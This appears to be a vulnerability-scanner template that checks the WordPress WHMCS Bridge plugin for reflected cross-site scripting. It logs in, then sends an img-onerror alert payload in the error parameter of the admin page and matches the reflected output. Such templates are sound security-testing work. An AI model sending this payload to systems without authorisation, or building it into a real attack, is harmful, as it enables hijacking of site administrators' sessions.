id: wp-whmcs-xss

info:
  name: WordPress WHMCS Bridge <6.4b - Cross-Site Scripting
  author: dhiyaneshDk
  severity: medium
  description: WordPress WHMCS Bridge before version 6.4b is vulnerable to reflected cross-site scripting because it does not sanitize and escape the error parameter before outputting it back in admin dashboard.
  reference:
    - https://wpscan.com/vulnerability/4aae2dd9-8d51-4633-91bc-ddb53ca3471c
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: wordpress,wp-plugin,authenticated,whmcs,xss

requests:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<strong><img src onerror=alert(document.domain)></strong>"
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

